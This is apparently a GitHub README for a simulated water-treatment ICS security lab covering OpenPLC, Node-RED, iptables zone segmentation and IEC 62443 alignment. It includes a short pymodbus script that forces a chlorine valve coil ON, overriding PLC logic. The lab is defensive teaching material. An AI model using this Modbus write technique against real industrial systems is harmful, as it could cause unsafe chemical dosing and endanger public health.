#  Cyber-Resilient Water Treatment ICS Security Lab

##  Overview
This project is a **hands-on Industrial Control Systems (ICS) / OT security lab** that simulates a **water treatment plant** and demonstrates **realistic cyber attacks, segmentation, and defensive controls** aligned with **IEC 62443** and **NIST 800-82**.

The lab intentionally mirrors **real OT constraints**: minimal tooling, unauthenticated industrial protocols, and safety-critical logic. Validation is done through **protocol behavior**, not GUI indicators.

---

##  Objectives
- Build a functioning **PLC-controlled industrial process**
- Expose and exploit **Modbus TCP weaknesses**
- Implement **zone-and-conduit network segmentation**
- Validate security controls using **ICS-appropriate tests**
- Demonstrate a **defensive OT engineering mindset**

---

##  Architecture

### Zones (IEC 62443)
```
IT Zone (Host VM)
    No direct OT access

DMZ Zone
   └── HMI (Node-RED)
        ↓ Modbus TCP (502)

OT Zone
   └── PLC (OpenPLC Runtime)
```

### Network Segmentation
- **OT Network:** `172.24.0.0/16`
- **DMZ Network:** `172.25.0.0/16`
- **IT → OT:** Blocked
- **DMZ → OT:** Allow-listed (Modbus TCP only)

Firewall enforcement is implemented using **iptables `DOCKER-USER` chain** with **stateful rules**.

---

##  Components

### PLC (OT Zone)
- **OpenPLC Runtime** (`tuttas/openplc_v3`)
- IEC 61131-3 Structured Text program
- Modbus TCP server on port `502`

### HMI (DMZ Zone)
- **Node-RED**
- Minimal runtime (no `apt`, no `pip`)
- Used as an operator / intermediary zone

### Host (IT Zone)
- Python automation
- Attack simulation
- Firewall enforcement

---

##  PLC Logic (Structured Text)

```pascal
PROGRAM WaterTreatment
PROGRAM WaterTreatment
VAR
  TankLevel : INT;
  Pump : BOOL;
  ChlorineValve : BOOL;
END_VAR

(* Normal operation *)
IF TankLevel < 40 THEN
  Pump := TRUE;
  ChlorineValve := TRUE;
ELSIF TankLevel > 90 THEN
  Pump := FALSE;
  ChlorineValve := FALSE;
END_IF;

```


### Modbus Mapping

<img width="679" height="658" alt="image" src="https://github.com/user-attachments/assets/fe7a1e3c-240f-4063-929c-d5c765c36baa" />
<img width="677" height="634" alt="image" src="https://github.com/user-attachments/assets/32439ba2-1683-4029-92c3-8c777125ff18" />


---

##  Attack Demonstrated

### Modbus Command Injection
An attacker writes directly to PLC coils using Modbus TCP, bypassing control logic.

```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("localhost", port=502)
client.connect()

# Force chlorine valve ON (coil 1)
client.write_coil(1, True)

print(" Chlorine valve forced ON")

client.close()

<img width="710" height="270" alt="image" src="https://github.com/user-attachments/assets/96dc6644-517d-43eb-ae23-2eab695e09a0" />

```

### Impact
- Chlorine valve forced ON
- PLC logic overridden
- Unsafe chemical dosing condition

Mapped to **MITRE ATT&CK for ICS – Unauthorized Command Message**.

---

##  Network Segmentation Controls

### Docker Networks
- `ot_net` (internal, PLC only)
- `dmz_net` (DMZ / HMI access)

### Firewall Policy (DOCKER-USER)
- Allow **ESTABLISHED, RELATED** traffic
- Allow **DMZ → OT Modbus TCP (502)**
- Drop **all other traffic to OT**

This enforces **zone-and-conduit architecture** consistent with **IEC 62443**.

---

##  Validation Strategy (ICS-Correct)

---
<img width="686" height="612" alt="image" src="https://github.com/user-attachments/assets/2c4edf19-2943-4a8c-bcd6-08d35bfeb577" />
<img width="712" height="622" alt="image" src="https://github.com/user-attachments/assets/25642d3a-ffe3-4b92-b7da-0e763b5571fa" />
<img width="640" height="377" alt="image" src="https://github.com/user-attachments/assets/05a8be97-ca3a-40e4-97a0-2ebf3f7990f9" />
<img width="709" height="651" alt="image" src="https://github.com/user-attachments/assets/0737af7b-b3ea-457f-94dd-2e2879d70aa5" />
<img width="700" height="582" alt="image" src="https://github.com/user-attachments/assets/0b43ab53-79e8-4826-bf1c-c42a278f12db" />

##  Overall Alignment Summary

The following table maps observed lab evidence (screenshots and command outputs) directly to the claims made in this README. Failed raw TCP tests are **intentional and expected** in ICS environments and are documented to demonstrate correct OT validation methodology.

| Screenshot Category | Result  | README Claim                          | 
|--------------------|---------|----------------------------------------|
| Modbus read/write  | Success | Protocol-level validation              | 
| Attack script      | Success | Unauthorized Modbus command injection  | 
| Docker networks    | Visible | Zone-based network separation          | 
| iptables rules     | Enforced| IEC 62443 zone-and-conduit enforcement |     
| Raw TCP failures   | Fail    | Expected OT protocol behavior          |        




---

##  Key Lessons Demonstrated
- OT systems are **not general-purpose OSes**
- Security prioritizes **safety and availability**
- Allow-listing is mandatory in ICS networks
- Tooling limitations are expected in real plants

---

##  Standards Alignment
- **IEC 62443** – Zones, conduits, least privilege
- **NIST SP 800-82** – ICS architecture and segmentation
- **MITRE ATT&CK for ICS** – Unauthorized command execution

---

##  Future Enhancements
- PLC fail-safe safety interlocks
- Process-aware anomaly detection
- OT IDS for Modbus write detection
- Automated SOAR response (OT isolation)
- Operator alerting and dashboards

---

##  Disclaimer
This project is for **educational and defensive security research only**. No real-world systems were targeted.

---
## ❤️ Author

Created by **Jeytha Sahana** 
